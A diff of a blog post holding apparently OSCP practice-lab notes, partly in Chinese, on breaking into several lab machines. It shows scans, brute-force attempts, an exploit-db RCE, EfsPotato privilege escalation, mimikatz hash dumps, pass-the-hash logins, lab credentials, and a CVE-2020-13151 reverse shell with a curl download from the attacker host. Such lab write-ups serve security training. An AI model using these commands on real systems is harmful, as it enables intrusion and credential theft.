@@ -1,29 +1,54 @@
 ---
-title: OSCP -A
-date: 2025-11-06T13:51:41+08:00
+title: OSCP A
+date: 2026-01-07
 draft: false
 ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-01-04T03:50:16.394Z
+lastmod: 2026-01-09T08:26:51.342Z
 ---
 # Box Info
 
-> Purpose: 實驗室儀器的可複製模板。請將每台儀器的範本複製到您的筆記中，並在操作過程中填寫。
+```
+10.10.188.140
 
-| IP              | Ports                               |
-| --------------- | ----------------------------------- |
-| 192.168.222.145 | 21,80,135,139,445,1987,3389         |
-| 192.168.222.144 | 21,22,80                            |
-| 192.168.222.143 | 21,22,80,81,443,3000,3003,3306,5432 |
-| 10.10.182.142   |                                     |
-| 192.168.222.141 | 22,80,81,                           |
-| 10.10.182.140   |                                     |
+Challenge 4 - DC01 OS Credentials:
 
-### \[\[Information Gathering/NMAP]] — Scans
+No credentials were provided for this machine
 
-> 集齊所有資訊
+192.168.228.141
+
+Challenge 4 - MS01 OS Credentials:
+
+Eric.Wallows / EricLikesRunning800
+
+10.10.188.142
+
+Challenge 4 - MS02 OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.228.143
+
+Challenge 4 - Aero OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.228.144
+
+Challenge 4 - Crystal OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.228.145
+
+Challenge 4 - Hermes OS Credentials:
+
+No credentials were provided for
+```
+
+### Information Gathering/NMAP — Scans
 
 ```shell
 sudo nmap -iL ip_list --reason -vv -p-  -o openPort.txt
@@ -99,9 +124,9 @@ Read data files from: /usr/share/nmap
 
 ```
 
-# Recon 192.168.x.141
+# Recon 192.168.X.141
 
-有80，81等等 80沒有發現，81 因為CVE 所以成為了突破點
+### nmap
 
 ```shell
 └─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.208.141 -oN serviceScan.txt
@@ -162,9 +187,9 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ```
 
-#### \[\[SSH 22]] --Scans
+### SSH 22 --Scans
 
-爆破失敗
+Burte force failed
 
 ```
 1 of 1 target completed, 0 valid password found
@@ -180,33 +205,32 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-15 13:53:
 
 ```
 
-#### Web Recon 192.168.178.141 80
+### Web Recon 80
 
-只有program.txt 不過沒有甚麼用
-
-##### \[\[Default 404 Pages]]
+只有program.txt 不過沒有甚麼用\
+\#####Default 404 Pages
 
 ```
 Apache/2.4.51 (Win64) PHP/7.4.26 Server at 192.168.208.141 Port 80
 ```
 
-##### \[\[WebSite Directory BurteForce]]
+\#####WebSite Directory BurteForce
 
 ```shell
 301      GET        9l       29w      329c http://192.168.208.141/images => http://192.168.208.141/images/
 301      GET        9l       29w      327c http://192.168.208.141/blog => http://192.168.208.141/blog/
-200      GET       32l      240w    15730c http://192.168.208.141/images/4.png
-200      GET       28l       69w     3004c http://192.168.208.141/images/7.png
-200      GET       32l      130w    10021c http://192.168.208.141/images/9.png
-200      GET       28l       69w     2985c http://192.168.208.141/images/8.png
+200      GET       32l      240w    15730c http://192.168.208.141/images/4.png]]
+200      GET       28l       69w     3004c http://192.168.208.141/images/7.png]]
+200      GET       32l      130w    10021c http://192.168.208.141/images/9.png]]
+200      GET       28l       69w     2985c http://192.168.208.141/images/8.png]]
 200      GET       11l       83w     5785c http://192.168.208.141/images/82896c5cfbeb3e9d628d685761d5106b.jpeg
 200      GET       92l      607w    66833c http://192.168.208.141/images/1.jpeg
 200      GET       10l       95w     5460c http://192.168.208.141/images/e55bae5793cb5e5848bd5882209fecba.jpeg
-200      GET        6l       46w     2873c http://192.168.208.141/images/11.png
+200      GET        6l       46w     2873c http://192.168.208.141/images/11.png]]
 200      GET       15l       64w     4334c http://192.168.208.141/images/8dc52c0f711979602e472cb74088d53b.jpeg
-200      GET       22l      148w    11627c http://192.168.208.141/images/6.png
-200      GET       19l       93w     6283c http://192.168.208.141/images/10.png
-200      GET       25l      148w    12449c http://192.168.208.141/images/5.png
+200      GET       22l      148w    11627c http://192.168.208.141/images/6.png]]
+200      GET       19l       93w     6283c http://192.168.208.141/images/10.png]]
+200      GET       25l      148w    12449c http://192.168.208.141/images/5.png]]
 200      GET        9l       73w     4740c http://192.168.208.141/images/f9e95c14b7f65aff23628e89fe290e03.jpeg
 200      GET       13l       91w     5581c http://192.168.208.141/images/e7176968fc88a5540a57f287ff13ce4e.jpeg
 200      GET      114l      942w    57690c http://192.168.208.141/images/ddddddd.jpg
@@ -225,19 +249,19 @@ Apache/2.4.51 (Win64) PHP/7.4.26 Server at 192.168.208.141 Port 80
 301      GET        9l       29w      329c http://192.168.208.141/script => http://192.168.208.141/script/
 200      GET        2l     1297w    89476c http://192.168.208.141/jquery.js
 200      GET      267l     1386w   121071c http://192.168.208.141/images/pexels-photo-3694884.jpeg
-200      GET       32l      240w    15730c http://192.168.208.141/Images/4.png
-200      GET       28l       69w     2985c http://192.168.208.141/Images/8.png
+200      GET       32l      240w    15730c http://192.168.208.141/Images/4.png]]
+200      GET       28l       69w     2985c http://192.168.208.141/Images/8.png]]
 200      GET       13l       91w     5581c http://192.168.208.141/Images/e7176968fc88a5540a57f287ff13ce4e.jpeg
-200      GET        6l       46w     2873c http://192.168.208.141/Images/11.png
-200      GET       19l       93w     6283c http://192.168.208.141/Images/10.png
+200      GET        6l       46w     2873c http://192.168.208.141/Images/11.png]]
+200      GET       19l       93w     6283c http://192.168.208.141/Images/10.png]]
 200      GET       15l       64w     4334c http://192.168.208.141/Images/8dc52c0f711979602e472cb74088d53b.jpeg
-200      GET       28l       69w     3004c http://192.168.208.141/Images/7.png
+200      GET       28l       69w     3004c http://192.168.208.141/Images/7.png]]
 200      GET       10l       95w     5460c http://192.168.208.141/Images/e55bae5793cb5e5848bd5882209fecba.jpeg
-200      GET       32l      130w    10021c http://192.168.208.141/Images/9.png
-200      GET       22l      148w    11627c http://192.168.208.141/Images/6.png
+200      GET       32l      130w    10021c http://192.168.208.141/Images/9.png]]
+200      GET       22l      148w    11627c http://192.168.208.141/Images/6.png]]
 200      GET       11l       83w     5785c http://192.168.208.141/Images/82896c5cfbeb3e9d628d685761d5106b.jpeg
 200      GET        9l       73w     4740c http://192.168.208.141/Images/f9e95c14b7f65aff23628e89fe290e03.jpeg
-200      GET       25l      148w    12449c http://192.168.208.141/Images/5.png
+200      GET       25l      148w    12449c http://192.168.208.141/Images/5.png]]
 200      GET       77l      553w    76801c http://192.168.208.141/Images/2.jpeg
 200      GET        9l       31w      262c http://192.168.208.141/script/how%20to%20use%20the%20program.txt
 200      GET       78l      332w    44713c http://192.168.208.141/blog/post-5.html
@@ -283,20 +307,20 @@ Apache/2.4.51 (Win64) PHP/7.4.26 Server at 192.168.208.141 Port 80
 200      GET       10l       95w     5460c http://192.168.208.141/IMAGES/e55bae5793cb5e5848bd5882209fecba.jpeg
 200      GET      114l      942w    57690c http://192.168.208.141/IMAGES/ddddddd.jpg
 200      GET       53l      363w    52008c http://192.168.208.141/IMAGES/3.jpeg
-200      GET       25l      148w    12449c http://192.168.208.141/IMAGES/5.png
-200      GET       32l      130w    10021c http://192.168.208.141/IMAGES/9.png
+200      GET       25l      148w    12449c http://192.168.208.141/IMAGES/5.png]]
+200      GET       32l      130w    10021c http://192.168.208.141/IMAGES/9.png]]
 200      GET       11l       83w     5785c http://192.168.208.141/IMAGES/82896c5cfbeb3e9d628d685761d5106b.jpeg
 200      GET      247l     1030w    73110c http://192.168.208.141/IMAGES/pretty-smiling-joyfully-female-with-fair-hair-dressed-casually-looking-with-satisfaction_176420-15187.jpg
 200      GET      267l     1386w   121071c http://192.168.208.141/IMAGES/pexels-photo-3694884.jpeg
-200      GET        6l       46w     2873c http://192.168.208.141/IMAGES/11.png
-200      GET       28l       69w     2985c http://192.168.208.141/IMAGES/8.png
-200      GET       28l       69w     3004c http://192.168.208.141/IMAGES/7.png
+200      GET        6l       46w     2873c http://192.168.208.141/IMAGES/11.png]]
+200      GET       28l       69w     2985c http://192.168.208.141/IMAGES/8.png]]
+200      GET       28l       69w     3004c http://192.168.208.141/IMAGES/7.png]]
 200      GET        9l       73w     4740c http://192.168.208.141/IMAGES/f9e95c14b7f65aff23628e89fe290e03.jpeg
 200      GET       13l       91w     5581c http://192.168.208.141/IMAGES/e7176968fc88a5540a57f287ff13ce4e.jpeg
 200      GET       15l       64w     4334c http://192.168.208.141/IMAGES/8dc52c0f711979602e472cb74088d53b.jpeg
-200      GET       19l       93w     6283c http://192.168.208.141/IMAGES/10.png
-200      GET       22l      148w    11627c http://192.168.208.141/IMAGES/6.png
-200      GET       32l      240w    15730c http://192.168.208.141/IMAGES/4.png
+200      GET       19l       93w     6283c http://192.168.208.141/IMAGES/10.png]]
+200      GET       22l      148w    11627c http://192.168.208.141/IMAGES/6.png]]
+200      GET       32l      240w    15730c http://192.168.208.141/IMAGES/4.png]]
 200      GET       77l      553w    76801c http://192.168.208.141/IMAGES/2.jpeg
 200      GET      163l      657w    53223c http://192.168.208.141/IMAGES/happy-man-with-long-thick-ginger-beard-has-friendly-smile_273609-16616.jpg
 200      GET      438l     2681w   218619c http://192.168.208.141/IMAGES/pexelsphoto3694884.jpeg
@@ -331,12 +355,13 @@ Then edit where your GPO.ps1 is located and run in power shell
 & C:\user location\GPO.ps1
 ```
 
-#### Web Recon 192.168.178.x 81
+### Web Reco 81
 
-![Pasted image 20251215143255.png](/ob/Pasted%20image%2020251215143255.png)![Pasted image 20251215144325.png](/ob/Pasted%20image%2020251215144325.png)\
+![Pasted image 20251215143255.png](/ob/Pasted%20image%2020251215143255.png)\
+![Pasted image 20251215144325.png](/ob/Pasted%20image%2020251215144325.png)\
 ![Pasted image 20251215144402.png](/ob/Pasted%20image%2020251215144402.png)
 
-##### \[\[WebSite Directory BurteForce]]
+### WebSite Directory BurteForce
 
 ```shell
 404      GET        9l       32w      287c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
@@ -401,16 +426,16 @@ Then edit where your GPO.ps1 is located and run in power shell
 200      GET       20l       88w     6046c http://192.168.208.141:81/dist/img/user4-128x128.jpg
 200      GET      349l     1562w    17298c http://192.168.208.141:81/dist/js/demo.js
 200      GET     1781l     5532w    48423c http://192.168.208.141:81/dist/css/skins/_all-skins.css
-200      GET       47l      265w    24361c http://192.168.208.141:81/dist/img/avatar04.png
+200      GET       47l      265w    24361c http://192.168.208.141:81/dist/img/avatar04.png]]
 200      GET        3l        4w      351c http://192.168.208.141:81/dist/img/default-50x50.gif
 200      GET        7l       53w     4847c http://192.168.208.141:81/dist/img/user1-128x128.jpg
-200      GET       28l      149w    15048c http://192.168.208.141:81/dist/img/avatar2.png
+200      GET       28l      149w    15048c http://192.168.208.141:81/dist/img/avatar2.png]]
 200      GET       27l      140w    11392c http://192.168.208.141:81/dist/img/user7-128x128.jpg
 200      GET       94l      209w     2284c http://192.168.208.141:81/bower_components/bootstrap/js/alert.js
 200      GET      116l      295w     4280c http://192.168.208.141:81/index
 200      GET       16l       96w     7493c http://192.168.208.141:81/dist/img/user6-128x128.jpg
 200      GET      800l     1613w    22644c http://192.168.208.141:81/bower_components/font-awesome/scss/_variables.scss
-200      GET       34l      184w    16798c http://192.168.208.141:81/dist/img/avatar3.png
+200      GET       34l      184w    16798c http://192.168.208.141:81/dist/img/avatar3.png]]
 200      GET      162l      483w     4838c http://192.168.208.141:81/bower_components/bootstrap/js/affix.js
 200      GET      155l      317w     3905c http://192.168.208.141:81/bower_components/bootstrap/js/tab.js
 200      GET       82l      207w     2404c http://192.168.208.141:81/bower_components/moment/src/moment.js
@@ -434,45 +459,45 @@ Then edit where your GPO.ps1 is located and run in power shell
 200      GET       62l      135w     1557c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.css
 200      GET       80l      336w     2929c http://192.168.208.141:81/bower_components/moment/locale/et.js
 200      GET       67l      283w     2185c http://192.168.208.141:81/bower_components/moment/locale/en-gb.js
-200      GET       24l      136w    11629c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.png
+200      GET       24l      136w    11629c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.png]]
 200      GET       97l      389w     3665c http://192.168.208.141:81/bower_components/moment/locale/lv.js
 200      GET       58l      221w     2574c http://192.168.208.141:81/bower_components/moment/locale/tzm.js
 200      GET      119l      398w     4803c http://192.168.208.141:81/bower_components/moment/locale/bo.js
 200      GET       90l      354w     3200c http://192.168.208.141:81/bower_components/moment/locale/mk.js
-200      GET        8l       34w     2537c http://192.168.208.141:81/plugins/iCheck/minimal/yellow@2x.png
-200      GET        8l       41w     2466c http://192.168.208.141:81/plugins/iCheck/minimal/minimal@2x.png
-200      GET        7l       28w     2063c http://192.168.208.141:81/plugins/iCheck/minimal/red.png
-200      GET       47l      399w    30342c http://192.168.208.141:81/plugins/iCheck/polaris/polaris@2x.png
-200      GET        9l       38w     2104c http://192.168.208.141:81/plugins/iCheck/minimal/orange.png
+200      GET        8l       34w     2537c http://192.168.208.141:81/plugins/iCheck/minimal/yellow@2x.png]]
+200      GET        8l       41w     2466c http://192.168.208.141:81/plugins/iCheck/minimal/minimal@2x.png]]
+200      GET        7l       28w     2063c http://192.168.208.141:81/plugins/iCheck/minimal/red.png]]
+200      GET       47l      399w    30342c http://192.168.208.141:81/plugins/iCheck/polaris/polaris@2x.png]]
+200      GET        9l       38w     2104c http://192.168.208.141:81/plugins/iCheck/minimal/orange.png]]
 200      GET       62l      136w     1626c http://192.168.208.141:81/plugins/iCheck/minimal/aero.css
-200      GET        7l       30w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/blue.png
-200      GET       10l       35w     2009c http://192.168.208.141:81/plugins/iCheck/minimal/purple.png
-200      GET        9l       33w     2528c http://192.168.208.141:81/plugins/iCheck/minimal/grey@2x.png
+200      GET        7l       30w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/blue.png]]
+200      GET       10l       35w     2009c http://192.168.208.141:81/plugins/iCheck/minimal/purple.png]]
+200      GET        9l       33w     2528c http://192.168.208.141:81/plugins/iCheck/minimal/grey@2x.png]]
 200      GET       56l      124w     1428c http://192.168.208.141:81/plugins/iCheck/flat/aero.css
-200      GET        7l       31w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/grey.png
+200      GET        7l       31w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/grey.png]]
 200      GET       56l      124w     1428c http://192.168.208.141:81/plugins/iCheck/flat/grey.css
 200      GET       62l      136w     1660c http://192.168.208.141:81/plugins/iCheck/minimal/purple.css
-200      GET        6l       31w     2033c http://192.168.208.141:81/plugins/iCheck/minimal/yellow.png
+200      GET        6l       31w     2033c http://192.168.208.141:81/plugins/iCheck/minimal/yellow.png]]
 200      GET      210l      745w     6064c http://192.168.208.141:81/dist/js/pages/dashboard.js
 200      GET       62l      136w     1609c http://192.168.208.141:81/plugins/iCheck/minimal/red.css
 200      GET       62l      136w     1626c http://192.168.208.141:81/plugins/iCheck/minimal/pink.css
-200      GET        6l       35w     2462c http://192.168.208.141:81/plugins/iCheck/minimal/purple@2x.png
-200      GET       19l       79w     5743c http://192.168.208.141:81/plugins/iCheck/flat/grey@2x.png
-200      GET        4l       37w     2620c http://192.168.208.141:81/plugins/iCheck/minimal/red@2x.png
-200      GET       10l       35w     2048c http://192.168.208.141:81/plugins/iCheck/minimal/green.png
-200      GET        5l       30w     2022c http://192.168.208.141:81/plugins/iCheck/minimal/aero.png
-200      GET        5l       39w     2552c http://192.168.208.141:81/plugins/iCheck/minimal/orange@2x.png
-200      GET       14l       85w     5843c http://192.168.208.141:81/plugins/iCheck/flat/flat@2x.png
-200      GET       17l      105w     5940c http://192.168.208.141:81/plugins/iCheck/flat/orange@2x.png
+200      GET        6l       35w     2462c http://192.168.208.141:81/plugins/iCheck/minimal/purple@2x.png]]
+200      GET       19l       79w     5743c http://192.168.208.141:81/plugins/iCheck/flat/grey@2x.png]]
+200      GET        4l       37w     2620c http://192.168.208.141:81/plugins/iCheck/minimal/red@2x.png]]
+200      GET       10l       35w     2048c http://192.168.208.141:81/plugins/iCheck/minimal/green.png]]
+200      GET        5l       30w     2022c http://192.168.208.141:81/plugins/iCheck/minimal/aero.png]]
+200      GET        5l       39w     2552c http://192.168.208.141:81/plugins/iCheck/minimal/orange@2x.png]]
+200      GET       14l       85w     5843c http://192.168.208.141:81/plugins/iCheck/flat/flat@2x.png]]
+200      GET       17l      105w     5940c http://192.168.208.141:81/plugins/iCheck/flat/orange@2x.png]]
 200      GET       56l      124w     1458c http://192.168.208.141:81/plugins/iCheck/flat/purple.css
 200      GET      106l      587w    35387c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.eot
-200      GET      156l     1018w    78571c http://192.168.208.141:81/dist/img/boxed-bg.png
+200      GET      156l     1018w    78571c http://192.168.208.141:81/dist/img/boxed-bg.png]]
 200      GET       56l      123w     1421c http://192.168.208.141:81/plugins/iCheck/futurico/futurico.css
-200      GET       14l       76w     5830c http://192.168.208.141:81/plugins/iCheck/flat/blue@2x.png
+200      GET       14l       76w     5830c http://192.168.208.141:81/plugins/iCheck/flat/blue@2x.png]]
 200      GET       78l      313w     2728c http://192.168.208.141:81/bower_components/moment/locale/de.js
-200      GET        9l       43w     2687c http://192.168.208.141:81/plugins/iCheck/flat/red.png
+200      GET        9l       43w     2687c http://192.168.208.141:81/plugins/iCheck/flat/red.png]]
 200      GET       56l      124w     1458c http://192.168.208.141:81/plugins/iCheck/flat/orange.css
-200      GET       28l       93w     6156c http://192.168.208.141:81/plugins/iCheck/futurico/futurico@2x.png
+200      GET       28l       93w     6156c http://192.168.208.141:81/plugins/iCheck/futurico/futurico@2x.png]]
 200      GET      122l      492w     4097c http://192.168.208.141:81/bower_components/moment/locale/gom-latn.js
 200      GET      104l      376w     3310c http://192.168.208.141:81/bower_components/moment/locale/zh-tw.js
 200      GET       99l      313w     2483c http://192.168.208.141:81/bower_components/moment/locale/ur.js
@@ -510,7 +535,7 @@ Then edit where your GPO.ps1 is located and run in power shell
 200      GET       70l      289w     2269c http://192.168.208.141:81/bower_components/moment/locale/sq.js
 200      GET       83l      360w     2796c http://192.168.208.141:81/bower_components/moment/locale/es.js
 200      GET      486l     3203w   220438c http://192.168.208.141:81/dist/img/boxed-bg.jpg
-200      GET        5l       19w     2102c http://192.168.208.141:81/dist/img/icons.png
+200      GET        5l       19w     2102c http://192.168.208.141:81/dist/img/icons.png]]
 200      GET       59l      197w     2164c http://192.168.208.141:81/bower_components/moment/locale/ar-tn.js
 200      GET      137l      515w     4478c http://192.168.208.141:81/bower_components/moment/locale/lb.js
 200      GET       89l      344w     2839c http://192.168.208.141:81/bower_components/moment/locale/ss.js
@@ -541,13 +566,13 @@ Then edit where your GPO.ps1 is located and run in power shell
 200      GET      162l      688w     5948c http://192.168.208.141:81/bower_components/moment/locale/sl.js
 200      GET      145l      512w     4618c http://192.168.208.141:81/bower_components/moment/locale/hr.js
 200      GET      120l      482w     3824c http://192.168.208.141:81/bower_components/moment/locale/tlh.js
-200      GET     1433l     8653w   763662c http://192.168.208.141:81/dist/img/photo2.png
+200      GET     1433l     8653w   763662c http://192.168.208.141:81/dist/img/photo2.png]]
 200      GET       20l      147w    11293c http://192.168.208.141:81/dist/img/user5-128x128.jpg
 200      GET       20l       93w     8707c http://192.168.208.141:81/dist/img/user8-128x128.jpg
-200      GET       22l      148w    14679c http://192.168.208.141:81/dist/img/avatar.png
+200      GET       22l      148w    14679c http://192.168.208.141:81/dist/img/avatar.png]]
 200      GET        6l       82w     5933c http://192.168.208.141:81/dist/img/user3-128x128.jpg
-200      GET       29l      164w    13759c http://192.168.208.141:81/dist/img/avatar5.png
-200      GET     2547l    15691w  1213097c http://192.168.208.141:81/dist/img/photo1.png
+200      GET       29l      164w    13759c http://192.168.208.141:81/dist/img/avatar5.png]]
+200      GET     2547l    15691w  1213097c http://192.168.208.141:81/dist/img/photo1.png]]
 200      GET       33l      159w    12210c http://192.168.208.141:81/dist/img/user2-160x160.jpg
 200      GET    13700l    49597w   452020c http://192.168.208.141:81/bower_components/moment/min/moment-with-locales.js
 200      GET     4023l    24508w  2157014c http://192.168.208.141:81/dist/img/photo4.jpg
@@ -647,7 +672,7 @@ Then edit where your GPO.ps1 is located and run in power shell
 200      GET      343l      828w    10089c http://192.168.208.141:81/bower_components/chart.js/src/Chart.Radar.js
 200      GET      303l      770w    13014c http://192.168.208.141:81/bower_components/jquery-knob/
 200      GET        1l      330w    95062c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-usa-en.js
-200      GET      755l     4545w   389831c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/drp.png
+200      GET      755l     4545w   389831c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/drp.png]]
 200      GET       15l      108w     7429c http://192.168.208.141:81/images/facebook-profile-image.jpeg
 200      GET    16617l    60375w   470596c http://192.168.208.141:81/bower_components/jquery-ui/jquery-ui.js
 200      GET       41l       73w     1084c http://192.168.208.141:81/bower_components/jquery-sparkline/Makefile
@@ -656,7 +681,7 @@ Then edit where your GPO.ps1 is located and run in power shell
 200      GET       20l       35w      391c http://192.168.208.141:81/bower_components/morris.js/bower.json
 200      GET       36l       71w      871c http://192.168.208.141:81/bower_components/morris.js/package.json
 200      GET        2l        8w      433c http://192.168.208.141:81/bower_components/morris.js/morris.css
-301      GET        9l       29w      355c http://192.168.208.141:81/bower_components/Ionicons/png => http://192.168.208.141:81/bower_components/Ionicons/png/
+301      GET        9l       29w      355c http://192.168.208.141:81/bower_components/Ionicons/png]] => http://192.168.208.141:81/bower_components/Ionicons/png]]/
 200      GET     1892l     7068w    66047c http://192.168.208.141:81/bower_components/morris.js/morris.js
 200      GET       22l      135w     1143c http://192.168.208.141:81/bower_components/bootstrap/ISSUE_TEMPLATE.md
 200      GET        9l       26w      365c http://192.168.208.141:81/bower_components/jquery-slimscroll/examples/index
@@ -731,17 +756,14 @@ Then edit where your GPO.ps1 is located and run in power shell
 
 ```
 
-http://192.168.208.141:81/db/
+Found the http://192.168.208.141:81/db/ with the database hashes, but it is faled
 
 ![Pasted image 20251215150836.png](/ob/Pasted%20image%2020251215150836.png)
 
-![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)
+![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)\
+The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801
 
 ![Pasted image 20251215151425.png](/ob/Pasted%20image%2020251215151425.png)
-
-> https://www.exploit-db.com/exploits/50801
-
-嘗試 因為title 的名字去找payload ，結果直接找到50801 ,然後直接RCE
 
 ```shell
 ─# python3 50801.py  http://192.168.208.141:81                
@@ -756,9 +778,11 @@ http://192.168.208.141:81/db/
 
 ```
 
+### mary.williams to admin(SeImpersonatePrivilege)
+
 ![Pasted image 20251215152042.png](/ob/Pasted%20image%2020251215152042.png)
 
-直接權限提升到本機的最高權限，下一步大思路是整個domain
+After the admin , use the mimikatz to find more
 
 ```shell
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe C:\ProgramData\EfsPotato.cs -nowarn:1691,618
@@ -1267,9 +1291,9 @@ mimikatz #
 
 ```
 
-celia.almeda : e728ecbadfb02f51ce8eed753f3ff3fd
+# MS01 To DC01 10.10.168.140
 
-透過mimitakz 找到Celia.almeda 的hashes ，可以進行橫向movement
+Found the `celia.almeda : e728ecbadfb02f51ce8eed753f3ff3fd` and base on that to go the 10.10.168.140
 
 ![Pasted image 20251215155631.png](/ob/Pasted%20image%2020251215155631.png)
 
@@ -1309,7 +1333,7 @@ Info: Establishing connection to remote endpoint
 
 ```
 
-Windows old 很奇怪\
+Windows old should not be here\
 ![Pasted image 20251215160528.png](/ob/Pasted%20image%2020251215160528.png)
 
 ![Pasted image 20251215162641.png](/ob/Pasted%20image%2020251215162641.png)
@@ -1349,7 +1373,7 @@ evil-winrm -i 10.10.100.140  -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc
 
 ***
 
-# Recon 192.168.217.143
+# Recon 192.168.X.143
 
 ```shell
 21/tcp   open  ftp        vsftpd 3.0.3
@@ -1387,7 +1411,7 @@ Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-#### \[\[SSH 22]] --Scans
+### SSH 22 --Scans
 
 > 可以在域上暴力破解主機名/子域。
 
@@ -1397,7 +1421,7 @@ Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 10:23:27
 ```
 
-#### \[\[FTP 21]] -- Scans
+### FTP 21 -- Scans
 
 * 匿名登入
 * 爆破登入
@@ -1418,120 +1442,99 @@ ftp>
 
 https://github.com/b4ny4n/CVE-2020-13151
 
-#### port 3003
+### port 3003
 
 ```
 └─# nc -nv 192.168.217.143 3003
 (UNKNOWN) [192.168.217.143] 3003 (?) open
 help
-bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
+- [ ] bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
 version 
 ```
 
-#### CVE-2020-13151(back later)
+![Pasted image 20260109150533.png](/ob/Pasted%20image%2020260109150533.png)
 
-***
-
-# Recon 192.168.217.144
-
-###### nmap 21,22,80
+### CVE-2020-13151
 
 ```
-Nmap scan report for 192.168.208.144
-Host is up, received echo-reply ttl 61 (0.040s latency).
-Scanned at 2025-12-15 13:43:35 HKT for 122s
-Not shown: 65532 closed tcp ports (reset)
-PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack ttl 61
-22/tcp open  ssh     syn-ack ttl 61
-80/tcp open  http    syn-ack ttl 61
-```
+└─# sudo nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.193] from (UNKNOWN) [192.168.228.143] 48028
+/bin/sh: 0: can't access tty; job control turned off
+$ 
 
-###### \[\[FTP 21]] -- Scans
+└─# uv run cve2020-13151.py --ahost 192.168.228.143  --pythonshell --lhost=192.168.45.193  --lport=80
+[+] aerospike build info: 5.1.0.1
 
-* 匿名登入
-* 爆破登入
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote JmArSQGQLiXfCFlA
+[+] registering udf
 
-> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。
-
-```
-ftp 192.168.217.144            
-
-Connected to 192.168.217.144.
-220 (vsFTPd 3.0.5)
-Name (192.168.217.144:root): anonymous
-331 Please specify the password.
-Password: 
-530 Login incorrect.
-ftp: Login failed
-ftp> 
 
 ```
 
-###### \[\[SSH 22]] -- Scans
-
-* 爆破登入
-
-> 如果允許任何爆破登入，這可能是取得檔和其他資訊的最佳位置。
-
-```
-92.168.217.144 - login "admin" - pass "insecure" - 136 of 137 [child 1] (2/3)
-[REDO-ATTEMPT] target 192.168.217.144 - login "root" - pass "PASSW0RD" - 136 of 137 [child 7] (3/3)
-1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 18:40:33                                                                                      
-```
-
-# Web Recon 192.168.178.144 80 🪲
-
-![Pasted image 20251216134111.png](/ob/Pasted%20image%2020251216134111.png)
-
-#### Step  1
-
-###### \[\[Default 404 Pages]]
-
-```
-Apache/2.4.52 (Ubuntu) Server at 192.168.217.144 Port 80
-```
-
-###### \[\[WebSite Directory BurteForce]]
-
-```
-http://192.168.217.144/cms/media/com_media/joomla.asset.json
-http://192.168.217.144/cms/language/en-GB/com_finder.commonwords.txt
-http://192.168.217.144/cms/administrator/includes/framework.php
+![Pasted image 20260109152811.png](/ob/Pasted%20image%2020260109152811.png)
 
 ```
 
-###### \[\[Exploit-CVE]]
+┌──(haydon_env)─(root㉿kali)-[~/tools]
+└─# sudo python3 -m http.server 21  
+Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ...
+192.168.228.143 - - [09/Jan/2026 15:32:17] "GET /pspy64 HTTP/1.1" 200 -
 
-```
-```
+-----------------------------------------------------------------------------
 
-###### \[\[git recon]]
-
-```
-```
-
-#### Login page
-
-###### \[\[SQL Injection (SQLi)]]
-
-```
+$ cd /tmp
+$ curl -L http://192.168.45.193:21/pspy64 -o pspy64
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 3032k  100 3032k    0     0  7150k      0 --:--:-- --:--:-- --:--:-- 7134k
+$ 
 ```
